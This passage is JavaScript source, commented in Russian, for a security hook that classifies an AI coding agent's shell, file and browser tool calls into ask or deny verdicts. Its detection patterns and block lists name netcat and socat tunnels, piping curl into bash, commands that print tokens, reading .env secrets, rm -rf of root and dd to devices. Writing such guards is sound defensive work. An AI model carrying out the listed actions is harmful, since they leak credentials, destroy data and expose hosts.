  if (!cmd) return toks.some((t) => path.basename(t) === 'env') ? 'env' : null;
  if (cmd === 'printenv' && rest.every((t) => t.startsWith('-'))) return cmd;
  if (cmd === 'set' && rest.length === 0) return cmd;
  if (['export', 'declare', 'typeset'].includes(cmd) && rest.every((t) => /^-[px]+$/.test(t))) return cmd;
  if (cmd === 'jq' && jqPrintsEnv(jqArgs(toks).program)) return cmd;
  return null;
}

// ---------------------------------------------------------------------------
// Публикация и деплой, секреты не из файла, передача наружу, необратимое,
// миграции. Распознаётся форма команды; обратимое (локальный up, reset --soft,
// stash, установка пакетов) идёт молча. Токены и пароли — deny: подтверждать
// нечем, значение нужно запросить у пользователя.

// cat — категория действия для разрешения из промпта (grant-core.mjs). Без неё ask
// спрашивается всегда: секреты в выводе, передача наружу, ssh, sudo.
const ask = (reason, cat) => (cat ? { level: ASK, reason, cat } : { level: ASK, reason });
const deny = (reason) => ({ level: DENY, reason });

// Свободные слова команды: без флагов и перенаправлений.
function freeWords(toks) {
  const rest = toks.slice(commandIndex(toks) + 1);
  const out = [];
  for (let i = 0; i < rest.length; i++) {
    const skip = redirectWords(rest[i]);
    if (skip) { i += skip - 1; continue; }
    if (!rest[i].startsWith('-')) out.push(rest[i]);
  }
  return out;
}

// Слово `a`, сразу за ним — одно из `bs`: `gh pr merge`, `docker volume rm`.
const pair = (w, a, ...bs) => w.some((x, i) => x === a && bs.includes(w[i + 1]));
const anyWord = (w, ...names) => w.some((x) => names.includes(x));

const PKG_MANAGERS = new Set(['npm', 'pnpm', 'yarn', 'bun']);
const PKG_PLAIN_VERBS = new Set(['install', 'i', 'add', 'ci', 'remove', 'uninstall', 'update', 'up', 'info', 'view', 'test']);
const RELEASE_SCRIPT_RE = /^(deploy|release|publish)([:_-]|$)|:(deploy|publish)$|(^|:)(migrate:prod|db:reset)$/;
const AWS_VERB_RE = /^(terminate|delete|create|put|update|run|start|stop|reboot|modify|deregister|register|send|publish|invoke|attach|detach)-[\w-]+$/;
const CLOUD_VERB_RE = /^(delete|create|update|deploy|apply|remove|set|add|start|stop|restart|reset|resize|submit|import|export|push|set-iam-policy|add-iam-policy-binding)$/;

function publishVerdict(cmd, toks, w) {
  if (PKG_MANAGERS.has(cmd)) {
    if (w.includes('publish')) return ask(`\`${cmd} publish\` публикует пакет в registry.`, 'deploy');
    const script = PKG_PLAIN_VERBS.has(w[0]) ? null : w.find((x) => RELEASE_SCRIPT_RE.test(x));
    if (script) return ask(`скрипт «${script}» похож на деплой или релиз.`, 'deploy');
  }
  if (cmd === 'make') {
    const target = w.find((x) => RELEASE_SCRIPT_RE.test(x));
    if (target) return ask(`цель make «${target}» похожа на деплой или релиз.`, 'deploy');
  }
  if (cmd === 'cargo' && w.includes('publish')) return ask('`cargo publish` публикует крейт.', 'deploy');
  if (cmd === 'twine' && w.includes('upload')) return ask('`twine upload` публикует пакет в PyPI.', 'deploy');
  if ((cmd === 'docker' || cmd === 'docker-compose' || cmd === 'podman') && w.includes('push')) {
    return ask('`docker push` публикует образ в registry.', 'deploy');
  }
  if (cmd === 'gh') {
    if (pair(w, 'pr', 'merge', 'create')) return ask('`gh pr` создаёт или сливает pull request.', 'mr');
    if (pair(w, 'release', 'create', 'delete', 'upload') || pair(w, 'workflow', 'run')) {
      return ask('`gh` выкладывает релиз или запускает workflow.', 'deploy');
    }
    if (pair(w, 'repo', 'delete', 'create') || pair(w, 'gist', 'create')) {
      return ask('`gh` публикует или меняет состояние на GitHub.');
    }
    if (w.includes('api') && (MUTATING_METHODS.has(methodOf(toks))
      || toks.some((t) => /^(-f|-F|--field|--raw-field|--input)$/.test(t)))) {
      return ask('`gh api` меняет состояние на GitHub.');
    }
  }
  if (cmd === 'glab' && pair(w, 'mr', 'merge', 'create')) return ask('`glab mr` создаёт или сливает merge request.', 'mr');
  if (cmd === 'glab' && pair(w, 'release', 'create')) return ask('`glab release` выкладывает релиз.', 'deploy');
  if (cmd === 'glab' && pair(w, 'repo', 'delete')) return ask('`glab` удаляет репозиторий на GitLab.');
  if ((cmd === 'terraform' || cmd === 'tofu') && anyWord(w, 'apply', 'destroy')) {
    return ask(`\`${cmd}\` меняет инфраструктуру.`, 'deploy');
  }
  if (cmd === 'pulumi' && anyWord(w, 'up', 'destroy')) return ask('`pulumi` меняет инфраструктуру.', 'deploy');
  if (cmd === 'helm' && anyWord(w, 'install', 'upgrade', 'uninstall', 'rollback', 'delete')) {
    return ask('`helm` меняет релиз в кластере.', 'deploy');
  }
  if (cmd === 'ansible-playbook' && !toks.some((t) => /^(--check|-C|--syntax-check|--list-hosts)$/.test(t))) {
    return ask('`ansible-playbook` меняет состояние хостов.', 'deploy');
  }
  if (cmd === 'vercel' && (w.length === 0 || anyWord(w, 'deploy', 'promote', 'rollback', 'remove', 'rm')
    || toks.includes('--prod'))) {
    return ask('`vercel` выкладывает или удаляет деплой.', 'deploy');
  }
  if ((cmd === 'fly' || cmd === 'flyctl') && anyWord(w, 'deploy', 'launch', 'destroy', 'scale')) {
    return ask('`fly` меняет приложение на Fly.io.', 'deploy');
  }
  if (cmd === 'railway' && anyWord(w, 'up', 'deploy', 'down')) return ask('`railway` меняет деплой.', 'deploy');
  if ((cmd === 'serverless' || cmd === 'sls') && anyWord(w, 'deploy', 'remove')) return ask('`serverless` меняет деплой.', 'deploy');
  if (cmd === 'netlify' && anyWord(w, 'deploy')) return ask('`netlify deploy` выкладывает сайт.', 'deploy');
  if (cmd === 'wrangler' && anyWord(w, 'deploy', 'publish', 'delete')) return ask('`wrangler` меняет воркер Cloudflare.', 'deploy');
  if (cmd === 'aws' && (w.some((x) => AWS_VERB_RE.test(x)) || pair(w, 's3', 'rm', 'sync', 'mb', 'rb', 'mv', 'cp'))) {
    return ask('`aws` меняет ресурсы облака.');
  }
  if ((cmd === 'gcloud' || cmd === 'az') && w.some((x) => CLOUD_VERB_RE.test(x))) {
    return ask(`\`${cmd}\` меняет ресурсы облака.`);
  }
  return null;
}

// Секрет приходит в транскрипт не из файла, а из вывода команды.
function secretOutputVerdict(cmd, toks, w, at) {
  const kubectlLike = cmd === 'kubectl' || cmd === 'oc';
  if (kubectlLike && w.includes('get') && w.some((x) => /^secrets?(\/|$)/.test(x))
    && toks.some((t) => /^(-o|--output)(=|$)|^-o\w/.test(t))) {
    return ask('`kubectl get secret -o …` печатает значения секретов. Нужен список — без `-o`.');
  }
  if (kubectlLike && pair(w, 'config', 'view') && toks.includes('--raw')) {
    return ask('`kubectl config view --raw` печатает токены и ключи кластера.');
  }
  if ((cmd === 'docker' || cmd === 'podman') && w.includes('inspect')) {
    return ask('`docker inspect` печатает переменные окружения контейнера. Нужно поле — `--format`.');
  }
  if (cmd === 'gh' && (pair(w, 'auth', 'token')
    || (pair(w, 'auth', 'status') && toks.some((t) => t === '-t' || t === '--show-token')))) {
    return deny('`gh auth token` печатает токен GitHub. Значение — запроси у пользователя.');
  }
  if (cmd === 'gcloud' && w.some((x) => /^print-(access|identity)-token$/.test(x))) {
    return deny('`gcloud … print-access-token` печатает токен. Значение — запроси у пользователя.');
  }
  if (cmd === 'aws') {
    if (anyWord(w, 'export-credentials', 'get-session-token', 'get-login-password', 'get-authorization-token')) {
      return deny('`aws` печатает учётные данные. Значение — запроси у пользователя.');
    }
    if (pair(w, 'configure', 'get') || pair(w, 'secretsmanager', 'get-secret-value')
      || (pair(w, 'ssm', 'get-parameter', 'get-parameters') && toks.includes('--with-decryption'))) {
      return ask('`aws` печатает секрет.');
    }
  }
  if (cmd === 'vault' && (pair(w, 'kv', 'get') || w.includes('read'))) return ask('`vault` печатает секрет.');
  if (cmd === 'op' && (anyWord(w, 'read', 'inject') || pair(w, 'item', 'get'))) return ask('`op` печатает секрет.');
  if (cmd === 'doppler' && w.includes('secrets')) return ask('`doppler secrets` печатает секреты.');
  if (cmd === 'heroku' && w.some((x) => /^config(:get)?$/.test(x))) return ask('`heroku config` печатает секреты.');
  if (cmd === 'vercel' && w.includes('env') && anyWord(w, 'ls', 'list', 'pull')) {
    return ask('`vercel env` печатает или скачивает секреты.');
  }
  if ((cmd === 'fly' || cmd === 'flyctl') && w.includes('secrets')) return ask('`fly secrets` работает с секретами.');
  if (cmd === 'security' && anyWord(w, 'find-generic-password', 'find-internet-password')) {
    return ask('`security` достаёт пароль из связки ключей.');
  }
  if (cmd === 'git') {
    const sub = toks[at];
    const args = toks.slice(at + 1);
    if (sub === 'credential' && anyWord(args, 'fill', 'approve', 'reject')) {
      return ask('`git credential` работает с хранилищем паролей.');
    }
    if (sub === 'config' && args.some((a) => /^credential\./.test(a)) && args.some((a) => /^(--get|--get-all|-l|--list)/.test(a))) {
      return ask('`git config` печатает настройки хранилища паролей.');
    }
  }
  return null;
}

// scp/rsync/sftp/rclone: уходит ли что-то на удалённый адрес. Назначение —
// последний операнд; скачивание на локальный путь не спрашивается.
const REMOTE_OPERAND_RE = /^(?:[\w.-]+@)?[\w.-]{2,}:(?!\/\/)|^rsync:\/\//;
const TUNNEL_CMDS = new Set(['nc', 'ncat', 'netcat', 'socat', 'ngrok', 'localtunnel', 'lt']);
const MAIL_CMDS = new Set(['mail', 'mailx', 'sendmail', 'mutt']);

function transferVerdict(cmd, toks, w) {
  if (cmd === 'scp' || cmd === 'rsync') {
    const rest = toks.slice(commandIndex(toks) + 1).filter((t) => !t.startsWith('-') && !redirectWords(t));
    const dest = rest[rest.length - 1] || '';
    if (rest.length >= 2 && REMOTE_OPERAND_RE.test(dest)) return ask(`\`${cmd}\` отправляет файлы на ${dest.split(':')[0]}.`);
  }
  if (cmd === 'sftp') return ask('`sftp` открывает сеанс передачи файлов на удалённый хост.');
  if (cmd === 'rclone' && anyWord(w, 'copy', 'sync', 'move', 'copyto', 'moveto', 'bisync')) {
    return ask('`rclone` копирует данные в удалённое хранилище.');
  }
  if (TUNNEL_CMDS.has(cmd)) return ask(`\`${cmd}\` открывает сетевое соединение или выставляет порт наружу.`);
  if (cmd === 'cloudflared' && w.includes('tunnel')) return ask('`cloudflared tunnel` выставляет порт наружу.');
  if (MAIL_CMDS.has(cmd)) return ask(`\`${cmd}\` отправляет письмо.`);
  return null;
}

// Необратимое локально: незакоммиченная работа, тома с данными, корень, диск.
const DANGEROUS_RM_RE = /^(\/\*?|~\/?\*?|\$\{?HOME\}?\/?\*?|\.{1,2}\/?\*?|\*|(\S*\/)?\.git\/?)$/;
// Корень и домашний каталог — без категории: «удали tmp» в промпте их не открывает.
const ROOT_OR_HOME_RE = /^(\/\*?|~\/?\*?|\$\{?HOME\}?\/?\*?)$/;

function gitRiskVerdict(toks, at) {
  const sub = toks[at];
  const args = toks.slice(at + 1);
  const free = args.filter((a) => !a.startsWith('-'));
  if (sub === 'reset' && args.includes('--hard')) return ask('`git reset --hard` стирает незакоммиченные изменения.', 'revert');
  if (sub === 'clean' && !args.some((a) => a === '-n' || a === '--dry-run')
    && args.some((a) => /^-[a-zA-Z]*f|^--force$/.test(a))) {
    return ask('`git clean -f` удаляет неотслеживаемые файлы.', 'delete');
  }
  if (sub === 'checkout' && free.includes('.')) return ask('`git checkout .` стирает незакоммиченные изменения.', 'revert');
  if (sub === 'restore' && free.includes('.') && !(args.includes('--staged') && !args.includes('--worktree'))) {
    return ask('`git restore .` стирает незакоммиченные изменения.', 'revert');
  }
  if (sub === 'branch' && (args.some((a) => /^-[a-zA-Z]*D/.test(a))
    || (args.some((a) => a === '--delete') && args.some((a) => a === '--force' || a === '-f')))) {
    return ask('`git branch -D` удаляет ветку вместе с неслитыми коммитами.', 'delete');
  }
  if (sub === 'stash' && anyWord(args, 'drop', 'clear')) return ask('`git stash drop|clear` стирает отложенную работу.', 'revert');
  if (sub === 'reflog' && anyWord(args, 'expire', 'delete')) return ask('`git reflog` стирает страховку от потери коммитов.');
  if (sub === 'filter-repo' || sub === 'filter-branch') return ask(`\`git ${sub}\` переписывает историю.`);
  if (sub === 'update-ref' && args.includes('-d')) return ask('`git update-ref -d` удаляет ссылку.');
  if (sub === 'remote' && anyWord(args.slice(0, 1), 'add', 'set-url')) {
    return ask('`git remote` меняет адрес, куда уйдёт следующий push.');
  }
  return null;
}

function irreversibleVerdict(cmd, toks, w) {
  if (cmd === 'rm' && toks.some((t) => /^-[a-zA-Z]*[rR]|^--recursive$/.test(t)) && w.some((x) => DANGEROUS_RM_RE.test(x))) {
    return ask('рекурсивное удаление корня, домашнего каталога, текущего каталога или `.git`.',
      w.some((x) => ROOT_OR_HOME_RE.test(x)) ? undefined : 'delete');
  }
  if (cmd === 'find' && toks.includes('-delete')) return ask('`find -delete` удаляет всё найденное.', 'delete');
  if (cmd === 'shred' || cmd === 'truncate' || cmd.startsWith('mkfs')) return ask(`\`${cmd}\` необратимо стирает данные.`);
  if (cmd === 'dd' && toks.some((t) => /^of=\/dev\//.test(t))) return ask('`dd` пишет прямо в устройство.');
  if (cmd === 'docker' || cmd === 'docker-compose' || cmd === 'podman') {
    if (w.includes('down') && toks.some((t) => t === '-v' || t === '--volumes')) {
      return ask('`down -v` удаляет тома с данными.', 'delete');
    }
    if (pair(w, 'volume', 'rm', 'prune')) return ask('`docker volume` удаляет тома с данными.', 'delete');
    if (pair(w, 'system', 'prune') && toks.some((t) => /^(-[a-z]*a[a-z]*|--all|--volumes)$/.test(t))) {
      return ask('`docker system prune -a` удаляет образы, контейнеры и тома.', 'delete');
    }
  }
  return null;
}

// Миграции и DDL. ORM берёт адрес базы из `.env`, в команде его не видно —
// боевая это база или локальная, решает человек.
const ORM_RUNNERS = new Set(['npx', 'pnpm', 'yarn', 'bunx', 'npm', 'bun', 'prisma', 'typeorm', 'knex', 'sequelize',
  'sequelize-cli', 'typeorm-ts-node-commonjs', 'typeorm-ts-node-esm']);
const SQL_DESTRUCTIVE_RE = /\b(drop|truncate)\b|\bdelete\s+from\b(?![^;]*\bwhere\b)/i;

function migrationVerdict(cmd, toks, w, seg) {
  if (ORM_RUNNERS.has(cmd)) {
    if (w.includes('prisma') || cmd === 'prisma') {
      if (pair(w, 'migrate', 'deploy', 'reset', 'resolve')) return ask('`prisma migrate` меняет схему базы из DATABASE_URL.', 'migrate');
      if (pair(w, 'db', 'push', 'execute') && (toks.includes('--accept-data-loss') || toks.includes('--force-reset')
        || w.includes('execute'))) {
        return ask('`prisma db` меняет базу из DATABASE_URL.', 'migrate');
      }
    }
    if (w.some((x) => /^(migration:(run|revert)|schema:(drop|sync))$/.test(x))) {
      return ask('`typeorm` меняет схему базы из окружения.', 'migrate');
    }
    if (w.some((x) => /^migrate:(latest|rollback|up|down)$/.test(x)) || (w.includes('knex') && pair(w, 'migrate', 'latest', 'rollback', 'up', 'down'))) {
      return ask('`knex migrate` меняет схему базы из окружения.', 'migrate');
    }
    if (w.some((x) => /^db:(migrate|drop)/.test(x))) return ask('`sequelize db:*` меняет базу из окружения.', 'migrate');
  }
  if ((cmd === 'psql' || cmd === 'mysql') && toks.some((t) => /^(-c|-e|--command|--execute)$/.test(t))
    && SQL_DESTRUCTIVE_RE.test(seg)) {
    return ask(`\`${cmd}\` выполняет разрушающий SQL (DROP, TRUNCATE или DELETE без WHERE).`);
  }
  return null;
}

// Повышение прав и системные настройки хоста.
function hostVerdict(cmd, toks, w) {
  const lead = toks.slice(0, commandIndex(toks)).map((t) => path.basename(t));
  if (lead.includes('sudo') || lead.includes('doas') || cmd === 'su') return ask('команда с правами root.');
  if ((cmd === 'chmod' || cmd === 'chown') && toks.some((t) => /^-[a-zA-Z]*R|^--recursive$/.test(t))) {
    return ask(`\`${cmd} -R\` меняет права всего дерева.`);
  }
  if (cmd === 'crontab' && (toks.some((t) => t === '-e' || t === '-r') || w.length)) {
    return ask('`crontab` меняет расписание задач.');
  }
  if (cmd === 'systemctl' && anyWord(w, 'start', 'stop', 'restart', 'enable', 'disable', 'mask', 'reload', 'daemon-reload', 'kill')) {
    return ask('`systemctl` меняет состояние сервиса.');
  }
  if ((cmd === 'iptables' || cmd === 'ip6tables')
    && toks.some((t) => /^-[AIDFXPRZ]$|^--(append|insert|delete|flush|policy|new-chain|delete-chain|replace)$/.test(t))) {
    return ask(`\`${cmd}\` меняет правила файрвола.`);
  }
  if (cmd === 'ufw' && anyWord(w, 'allow', 'deny', 'delete', 'enable', 'disable', 'reset', 'reject', 'limit', 'insert', 'route')) {
    return ask('`ufw` меняет правила файрвола.');
  }
  if (cmd === 'nft' && anyWord(w, 'flush', 'add', 'delete', 'insert', 'replace')) return ask('`nft` меняет правила файрвола.');
  return null;
}

// Команды, исполняющие скачанное: `curl … | bash`.
const FETCH_CMDS = new Set(['curl', 'wget', 'http', 'httpie']);
const SHELL_EXEC_CMDS = new Set(['sh', 'bash', 'zsh', 'dash', 'ksh', ...INTERPRETERS]);

function riskVerdict(cmd, toks, seg, { fromFetch }) {
  const w = freeWords(toks);
  if (fromFetch && SHELL_EXEC_CMDS.has(cmd)) return ask('скачанное из сети исполняется без просмотра.');
  const at = gitSubcommandAt(toks);
  return publishVerdict(cmd, toks, w)
    || secretOutputVerdict(cmd, toks, w, at)
    || transferVerdict(cmd, toks, w)
    || (cmd === 'git' && gitRiskVerdict(toks, at))
    || irreversibleVerdict(cmd, toks, w)
    || migrationVerdict(cmd, toks, w, seg)
    || hostVerdict(cmd, toks, w);
}

// Удалённая команда ssh, кроме чтения, меняет состояние хоста.
const SSH_READ_CMDS = new Set(['ls', 'cat', 'tail', 'head', 'df', 'du', 'uptime', 'journalctl', 'free', 'ps', 'top',
  'whoami', 'hostname', 'date', 'uname', 'id', 'pwd', 'echo', 'grep', 'wc', 'stat', 'file', 'which', 'git', 'true']);

function sshRemoteVerdict(toks, at) {
  if (toks.some((t) => /^-[RL]/.test(t))) return ask('`ssh -R|-L` пробрасывает порт: сервис станет доступен снаружи или изнутри.');
  const remote = afterTarget(toks, at + 1, SSH_ARG_OPTS).join(' ');
  if (!remote.trim()) return null;
  const names = segments(remote).map((s) => baseCommand(commandName(tokenize(s.text))));
  if (names.some((n) => n && !SSH_READ_CMDS.has(n))) return ask('команда меняет состояние удалённого хоста.');
  return null;
}

// Команды, для которых тело heredoc — текст, а не код.
const DATA_HEREDOC_CMDS = new Set(['git', 'cat', 'tee', 'gh', 'glab', 'curl', 'wget', 'http', 'httpie', 'echo', 'printf']);
const HEREDOC_OPEN_RE = /<<-?\s*(?:'\w+'|"\w+"|\\?\w+)/;

// Сегмент с heredoc (keepHeredoc) → строка команды и тело после неё.
function splitHeredoc(text) {
  const m = text.match(HEREDOC_OPEN_RE);
  const nl = m ? text.indexOf('\n', m.index + m[0].length) : -1;
  return nl === -1 ? { head: text, body: '' } : { head: text.slice(0, nl), body: text.slice(nl + 1) };
}

// Разрешение из промпта снимает ask своей категории: вердикт уходит в ctx.granted,
// разбор идёт дальше — `git push && rm -rf ~` по «запушь» всё равно спросит про rm. deny не снимается.
function settle(verdict, ctx) {
  if (verdict?.level !== ASK || !verdict.cat || !ctx.isGranted?.(verdict.cat)) return verdict;
  ctx.granted?.push(verdict);
  return null;
}

// ctx: { isGranted(cat), granted: [] } — разрешения сессии и снятые ими вердикты.
export function guardBashSecurity(command, depth = 0, ctx = {}) {
  const raw = String(command || '');
  if (!raw.trim() || depth > 3) return null;

  let prevCmd = '';
  let prevBody = '';
  for (const { text: full, piped } of segments(raw, { keepHeredoc: true })) {
    const { head: seg, body } = splitHeredoc(full);
    const toks = tokenize(seg);
    const cmd = baseCommand(commandName(toks));
    const fromFetch = piped && FETCH_CMDS.has(prevCmd);
    // Тело heredoc — команды у оболочки, интерпретатора, ssh; у git, cat, tee,
    // curl — данные (сообщение коммита, файл). Данные, попавшие в `| bash`, снова команды.
    const script = body && !DATA_HEREDOC_CMDS.has(cmd) ? body : piped && SHELL_EXEC_CMDS.has(cmd) ? prevBody : '';
    prevCmd = cmd;
    prevBody = body;
    const verdict = settle(segmentVerdict({ raw, seg, toks, cmd, piped, fromFetch, script }, depth, ctx), ctx);
    if (verdict) return verdict;
  }
  return null;
}

function segmentVerdict({ raw, seg, toks, cmd, piped, fromFetch, script }, depth, ctx) {
  if (script) {
    const verdict = guardBashSecurity(script, depth + 1, ctx);
    if (verdict) return verdict;
  }

  // До отсева пустого cmd: голый `env` — обёртка без команды, имя у него пустое.
  const envCmd = printsEnv(toks);
  if (envCmd) {
    return {
      level: ASK,
      reason: `\`${envCmd}\` печатает всё окружение. Нужна одна переменная — назови её явно.`,
    };
  }

  if (!cmd) return null;

  // Вложенные команды разбираем до всего остального: обёртка сама по себе
  // безобидна, опасно то, что она запускает.
  const nested = nestedCommands(toks, cmd);
  for (const inner of nested) {
    const verdict = guardBashSecurity(inner, depth + 1, ctx);
    if (verdict) return verdict;
  }

  // Путь снаружи, чтение внутри: `find . -name .env -exec cat {} \;`. У dotenv путь
  // снаружи — его `-e`: файл уходит в окружение, а не в вывод `node dist/main.js`.
  if (nested.length && cmd !== 'dotenv' && nestedReadsFile(nested)) {
    const outer = secretPathsIn(seg, toks)[0];
    if (outer) return secretReason(outer);
  }

  if (cmd === 'dotenv') {
    const printed = dotenvPrintsSecret(toks);
    if (printed) return secretReason(printed);
  }

  // git читает содержимое из истории, даже когда файла нет в рабочей копии.
  if (cmd === 'git' && toks.some((t) => GIT_READ_SUBCMDS.has(t))) {
    const hit = secretPathsIn(seg, toks)[0];
    if (hit) return secretReason(hit);
  }

  // Секреты проверяем первыми: `curl -T .env` — это не «отправка данных,
  // подтверди», а утечка ключей, и подтверждать её нечем.
  // Запрещаем только чтение: содержимое попадает в транскрипт навсегда.
  // Запись безвредна — `cp .env.example .env` и `echo X >> .env` ничего не
  // раскрывают, и блокировать их значит мешать обычной настройке проекта.
  // Читающая команда из пайпа берёт путь из соседнего сегмента
  // (`echo .env | xargs cat`), поэтому кандидатов ищем по всей строке. Так же
  // интерпретатор с heredoc (`python - <<EOF`): его код — в следующих строках.
  const heredocCode = INTERPRETERS.has(cmd) && seg.includes('<<');
  const scope = (piped && READS_FILE.has(cmd)) || heredocCode ? raw : seg;
  const secret = readsSecret(scope, toks, cmd);
  if (secret) return secretReason(secret);

  if (GREP_CMDS.has(cmd) && grepWithoutInclude(toks)) {
    return {
      level: DENY,
      reason: 'рекурсивный grep без `--include` на расширения кода читает и `.env` в дереве. ' +
        'В проекте с `.tokensave/` символ ищет `tokensave_search`, точную строку — ' +
        '`tokensave_search` с `literal: true` (grep по коду там останавливает хук tokensave ' +
        'и с `--include`); доки, конфиги, yml, инфраструктуру — `rag_search`; вне индексов ' +
        'укажи файлы: `--include=*.ts` (можно несколько).',
    };
  }

  // Команды, печатающие окружение целиком. Секрет в них приходит не из
  // файла, а из вывода, и по имени файла его не поймать: `printenv` в
  // проекте с экспортированным токеном кладёт его в транскрипт так же
  // надёжно, как `cat .env`.
  if (/^docker(-compose)?$/.test(cmd) && toks.includes('config') && !toks.includes('--services')) {
    return {
      level: ASK,
      reason: '`docker compose config` печатает конфиг с подставленными секретами. Список сервисов — `--services`.',
    };
  }

  if (DUMP_CMDS.has(cmd)) {
    return { level: ASK, reason: `\`${cmd}\` выгружает базу целиком.` };
  }

  if (DB_CLIENTS.has(cmd)) {
    const external = dbHostsIn(raw, seg, toks).filter((h) => !LOCAL_HOST_RE.test(h));
    if (external.length) {
      return { level: ASK, reason: `\`${cmd}\` идёт на внешний хост ${external[0]} — возможно, боевая база.` };
    }
    if (/\.dump\b|--rdb\b|COPY\s+.*\bTO\b/i.test(seg)) {
      return { level: ASK, reason: `\`${cmd}\` выгружает содержимое базы.` };
    }
  }

  if (cmd === 'sqlite3' && /\.dump\b/.test(seg)) {
    return { level: ASK, reason: 'sqlite3 .dump выгружает базу целиком.' };
  }

  if (cmd === 'git') {
    const at = gitSubcommandAt(toks);
    const fileVerdict = gitFileVerdict(toks, at);
    if (fileVerdict) return fileVerdict;
    if (toks[at] === 'push') {
      const push = gitPushReason(toks, at);
      if (push) return ask(push.reason, push.cat);
    }
  }

  if (cmd === 'docker' || cmd === 'docker-compose') {
    const acts = ['up', 'down', 'restart', 'stack', 'push'];
    if (toks.some((t) => acts.includes(t)) && PROD_TOKEN_RE.test(seg)) {
      return ask('docker меняет прод-конфигурацию.', 'deploy');
    }
  }

  if (cmd === 'docker' || cmd === 'docker-compose' || cmd === 'podman') {
    if (toks.includes('login')) return ask('`docker login` сохраняет учётные данные registry.');
    if (toks.includes('run') && (toks.includes('--privileged') || /(?:^|\s)(?:-v|--volume)(?:=|\s+)["']?\/:/.test(seg)
      || /--mount[= ].*\bsrc(?:ource)?=\/(?:,|\s|$)/.test(seg))) {
      return ask('контейнер с полным доступом к хосту (`--privileged` или монтирование `/`).');
    }
  }

  if (cmd === 'kubectl' && toks.some((t) => ['apply', 'delete', 'scale', 'rollout', 'patch', 'exec', 'cp', 'drain',
    'cordon', 'uncordon', 'taint', 'edit', 'port-forward', 'create', 'set', 'replace', 'annotate', 'label'].includes(t))) {
    return { level: ASK, reason: 'kubectl меняет состояние кластера.' };
  }

  if (cmd === 'ssh') {
    const remote = sshRemoteVerdict(toks, commandIndex(toks));
    if (remote) return remote;
  }

  if (cmd === 'curl' || cmd === 'wget' || cmd === 'http' || cmd === 'httpie') {
    const reason = outboundReason(toks, seg);
    if (reason) return { level: ASK, reason };
  }

  return riskVerdict(cmd, toks, seg, { fromFetch });
}

export function guardReadSecurity(filePath) {
  if (!filePath) return null;
  // Симлинк с безобидным именем (`config.txt` → `.env`) читается как цель.
  const real = isSecretPath(filePath) ? null : resolveReal(String(filePath));
  if (real && !isSecretPath(real)) return null;
  const shown = real ? `${filePath}\` → \`${real}` : filePath;
  return {
    level: DENY,
    reason: `\`${shown}\` — хранилище секретов, чтение запрещено. ` +
      'Структура — `.env.example`; значение — запроси у пользователя.',
  };
}

// MCP-инструменты, которые отдают содержимое файла. Они идут мимо Read, и без
// этого списка гард закрывал бы парадную дверь при открытом чёрном ходе.
// Имя файла у них лежит в разных полях, поэтому проверяем все правдоподобные.
const MCP_FILE_READERS = /^mcp__\w+__\w*(read|body|signature|context|cat|open|file)\w*$/i;

function mcpFileTarget(ti) {
  return ti.file || ti.file_path || ti.path || ti.symbol || '';
}

// Браузер тоже читает с диска: `file://…/.env` в адресе и файл, выбранный для
// загрузки на страницу. Имена — Playwright MCP под любым именем сервера.
const BROWSER_NAVIGATE_RE = /^mcp__\w+__\w*browser_navigate$/;
const BROWSER_UPLOAD_RE = /^mcp__\w+__\w*browser_file_upload$/;

// Путь из `file://` без %-кодов; любой другой адрес — пустая строка.
function fileUrlPath(url) {
  const s = String(url || '');
  if (!/^file:/i.test(s)) return '';
  try {
    return fileURLToPath(s);
  } catch {
    return s.replace(/^file:\/*/i, '/');
  }
}

function realpathOrSelf(p) {
  try { return fs.realpathSync(p); } catch { return p; }
}

// Реальный путь, даже если файла ещё нет: разворачиваем ближайшего
// существующего предка, остаток пристёгиваем. Иначе `~/.ai-hooks/…` (симлинк)
// или новый файл внутри харнеса выглядели бы чужими.
function resolveReal(p) {
  let dir = path.resolve(p);
  const rest = [];
  while (!fs.existsSync(dir) && path.dirname(dir) !== dir) {
    rest.unshift(path.basename(dir));
    dir = path.dirname(dir);
  }
  return path.join(realpathOrSelf(dir), ...rest);
}

// Файлы разрешений пишет только хук промпта: иначе агент выдал бы согласие себе сам.
const GRANTS_DENY = deny('the prompt-grant state is written only by the UserPromptSubmit hook from the ' +
  "user's own words; do not read or change it. Ask the user to name the action in their next prompt.");

// Единая точка для адаптера хука. ctx — разрешения из промпта (см. guardBashSecurity).
export function securityGuard(toolName, toolInput = {}, ctx = {}) {
  const name = String(toolName || '');
  // Имена tokensave — настоящие: хук tool-args переименует `file` в `path` уже
  // после гарда, и правка `.env` по `file` иначе прошла бы без проверки.
  const ti = normalizeToolInput(name, toolInput) || {};
  if ([ti.command, ti.code, ti.file_path, ti.notebook_path, ti.path].some(touchesGrants)) return GRANTS_DENY;

  if (name === 'Read') return guardReadSecurity(ti.file_path || ti.path || '');
  if (name === 'Edit' || name === 'Write' || name === 'MultiEdit' || name === 'NotebookEdit') {
    const file = ti.file_path || ti.notebook_path || ti.path || '';
    return guardReadSecurity(file);
  }
  // tokensave пишет по абсолютному пути и вне своего проекта — та же правка, что Edit.
  // Относительный путь он считает от `project_root` (синоним `cwd`), иначе — от корня сессии.
  if (MCP_EDIT_RE.test(name) && ti.path) {
    const base = ti.project_root || ti.cwd;
    const file = base ? path.resolve(String(base), String(ti.path)) : String(ti.path);
    return guardReadSecurity(file);
  }
  if (name === 'Bash') return guardBashSecurity(ti.command, 0, ctx);
  if (name === 'mcp__ide__executeCode') return guardBashSecurity(ti.code, 0, ctx);
  if (name === 'Grep') {
    // glob проверяется и как имя, и как шаблон: `.env*` захватывает `.env`,
    // `.env.*` — `.env.local`.
    const glob = String(ti.glob || '');
    const target = [ti.path, glob, glob.replace(/\*+/g, ''), glob.replace(/\*+/g, 'x')]
      .find((p) => p && isSecretPath(p));
    return target ? guardReadSecurity(target) : null;
  }
  if (BROWSER_NAVIGATE_RE.test(name)) return guardReadSecurity(fileUrlPath(ti.url));
  if (BROWSER_UPLOAD_RE.test(name)) {
    const paths = Array.isArray(ti.paths) ? ti.paths : [];
    return paths.map((p) => guardReadSecurity(p)).find(Boolean) || null;
  }
  if (MCP_FILE_READERS.test(name)) return guardReadSecurity(mcpFileTarget(ti));
  return null;
}
